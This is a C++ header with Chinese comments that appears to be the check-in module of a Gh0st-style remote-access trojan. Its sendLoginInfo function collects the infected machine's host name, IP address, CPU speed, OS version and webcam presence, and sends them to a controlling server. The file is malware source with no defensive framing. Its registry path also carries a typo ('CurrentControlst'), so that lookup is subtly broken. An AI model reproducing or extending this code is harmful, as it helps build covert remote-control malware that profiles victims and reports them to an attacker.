#pragma once
#include "Include/RegEditEx.h"
#include <Vfw.h>

#pragma  comment(lib,"vfw32.lib")

#pragma pack(1)      //--字节对齐
typedef struct 
{
	BYTE             bToken;         //    = 1    告诉服务器是什么封包
	char             UserName[50];   //    50
	char             Password[50];   //    50
	IN_ADDR          IPAddress;      //    储存32位的IPv的地址数据结构
	char             HostName[50];   //    主机名
	bool             bIsWebCam;      //    是否有摄像头
	OSVERSIONINFOEX  OsVerInfoEx;    //    版本信息
	int              CPUClockMhz;    //    CPU主频
	DWORD            dwSpeed;        //    连接速度
}lOGININFO;
#pragma pack()      //--字节对齐

//得到主机名
UINT GetHostRemark(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char strSubKey[1024];
	memset(lpBuffer,0,uSize);
	
	memset(strSubKey, 0, sizeof(strSubKey));

	wsprintf(strSubKey, R"(SYSTEM\CurrentControlst\Services\%s)", lpServiceName);

	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char*)lpBuffer, NULL, uSize, 0);

	if (lstrlen(lpBuffer) == 0)
		gethostname(lpBuffer, uSize);

	return lstrlen(lpBuffer);
}

DWORD GetCPUClockMhz()
{
	HKEY     hKey;
	DWORD    dwCPUMhz;
	DWORD    dwBytes = sizeof(DWORD);
	DWORD    dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
	RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return dwCPUMhz;
}

bool IsWebCam()
{
	bool bRet = false;

	char lpszName[100], lpszVer[50];

	for (int i = 0;i < 10 && !bRet;i++)
	{
		bRet = capGetDriverDescription(i, lpszName, sizeof(lpszName),
			lpszVer, sizeof(lpszVer));
	}
	return bRet;
}

int sendLoginInfo(LPCTSTR strServiceName,CClientSocket * pClient,DWORD dwSpeed,const char *username, const char *password)
{
	lOGININFO login_info;   //CCCCCCCC在栈上
	memset(&login_info, 0, sizeof(login_info));   //清空栈上的垃圾
	//令牌
	login_info.bToken = TOKEN_LOGIN;
	//账号密码
	lstrcpy(login_info.UserName, username);
	lstrcpy(login_info.Password, password);

	//连接速度
	login_info.dwSpeed = dwSpeed;

	//连接的IP地址
	sockaddr_in sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);

	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);

	memcpy(&login_info.IPAddress, (void*)&sockAddr.sin_addr, sizeof(IN_ADDR));

	//主机名
	char hostname[256];
	GetHostRemark(strServiceName, hostname, sizeof(hostname));
	memcpy(&login_info.HostName, hostname, sizeof(login_info.HostName));

	//CPU
	login_info.CPUClockMhz = GetCPUClockMhz();
	//是否有摄像头
	login_info.bIsWebCam = IsWebCam();
	//-------------------
	pClient->Send((LPBYTE)&login_info, sizeof(login_info));

	return 0;
}